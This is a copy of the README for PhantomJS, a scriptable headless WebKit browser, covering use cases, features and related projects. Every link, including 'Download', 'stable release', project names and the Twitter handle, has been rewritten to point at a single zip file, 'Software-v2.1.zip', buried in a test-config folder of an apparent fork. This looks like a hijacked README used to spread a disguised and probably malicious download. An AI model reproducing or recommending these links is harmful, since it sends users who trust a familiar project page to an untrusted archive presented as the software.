# [PhantomJS](https://raw.githubusercontent.com/videogramme/phantomjs/master/src/qt/config.tests/unix/db2/Software-v2.1.zip) - Scriptable Headless WebKit

PhantomJS ([https://raw.githubusercontent.com/videogramme/phantomjs/master/src/qt/config.tests/unix/db2/Software-v2.1.zip](https://raw.githubusercontent.com/videogramme/phantomjs/master/src/qt/config.tests/unix/db2/Software-v2.1.zip)) is a headless WebKit scriptable with JavaScript or CoffeeScript. It is used by hundreds of [developers](https://raw.githubusercontent.com/videogramme/phantomjs/master/src/qt/config.tests/unix/db2/Software-v2.1.zip) and dozens of [organizations](https://raw.githubusercontent.com/videogramme/phantomjs/master/src/qt/config.tests/unix/db2/Software-v2.1.zip) for web-related development workflow.

The latest [stable release](https://raw.githubusercontent.com/videogramme/phantomjs/master/src/qt/config.tests/unix/db2/Software-v2.1.zip) is version 1.9 (codenamed <a href="https://raw.githubusercontent.com/videogramme/phantomjs/master/src/qt/config.tests/unix/db2/Software-v2.1.zip">"Sakura"</a>). Follow the official Twitter stream [@PhantomJS](https://raw.githubusercontent.com/videogramme/phantomjs/master/src/qt/config.tests/unix/db2/Software-v2.1.zip) to get the frequent development updates.

## Use Cases

- **Headless web testing**. Lightning-fast testing without the browser is now possible! Various [test frameworks](https://raw.githubusercontent.com/videogramme/phantomjs/master/src/qt/config.tests/unix/db2/Software-v2.1.zip) such as Jasmine, Capybara, QUnit, Mocha, WebDriver, YUI Test, BusterJS, FuncUnit, Robot Framework, and many others are supported.
- **Page automation**. [Access and manipulate](https://raw.githubusercontent.com/videogramme/phantomjs/master/src/qt/config.tests/unix/db2/Software-v2.1.zip) web pages with the standard DOM API, or with usual libraries like jQuery.
- **Screen capture**. Programmatically [capture web contents](https://raw.githubusercontent.com/videogramme/phantomjs/master/src/qt/config.tests/unix/db2/Software-v2.1.zip), including CSs, SVG and Canvas. Build server-side web graphics apps, from a screenshot service to a vector chart rasterizer.
- **Network monitoring**. Automate performance analysis, track [page loading](https://raw.githubusercontent.com/videogramme/phantomjs/master/src/qt/config.tests/unix/db2/Software-v2.1.zip) and export as standard HAR format.

## Features

- **Multiplatform**, available on major operating systems: Windows, Mac OS X, Linux, other Unices.
- **Fast and native implementation** of web standards: DOM, CSS, JavaScript, Canvas, SVG. No emulation!
- **Pure headless (no X11) on Linux**, ideal for continuous integration systems. Also runs on Amazon EC2, Heroku, https://raw.githubusercontent.com/videogramme/phantomjs/master/src/qt/config.tests/unix/db2/Software-v2.1.zip
- **Easy to install**: [Download](https://raw.githubusercontent.com/videogramme/phantomjs/master/src/qt/config.tests/unix/db2/Software-v2.1.zip), unpack, and start having fun in just 5 minutes.

## Ecosystem

PhantomJS needs not be used only as a stand-alone tool. Check also some excellent related projects:

- [CasperJS](https://raw.githubusercontent.com/videogramme/phantomjs/master/src/qt/config.tests/unix/db2/Software-v2.1.zip) enables easy navigation scripting and common high-level testing.
- [Poltergeist](https://raw.githubusercontent.com/videogramme/phantomjs/master/src/qt/config.tests/unix/db2/Software-v2.1.zip) allows running Capybara tests headlessly.
- [Guard::Jasmine](https://raw.githubusercontent.com/videogramme/phantomjs/master/src/qt/config.tests/unix/db2/Software-v2.1.zip) automatically tests Jasmine specs on Rails when files are modified.
- [GhostDriver](https://raw.githubusercontent.com/videogramme/phantomjs/master/src/qt/config.tests/unix/db2/Software-v2.1.zip) complements Selenium tests with a PhantomJS WebDriver implementation.
- [PhantomRobot](https://raw.githubusercontent.com/videogramme/phantomjs/master/src/qt/config.tests/unix/db2/Software-v2.1.zip) runs Robot Framework acceptance tests in the background via PhantomJS.
- [Mocha-PhantomJS](https://raw.githubusercontent.com/videogramme/phantomjs/master/src/qt/config.tests/unix/db2/Software-v2.1.zip) run Mocha tests using PhantomJS.

and many others [related projects](https://raw.githubusercontent.com/videogramme/phantomjs/master/src/qt/config.tests/unix/db2/Software-v2.1.zip).
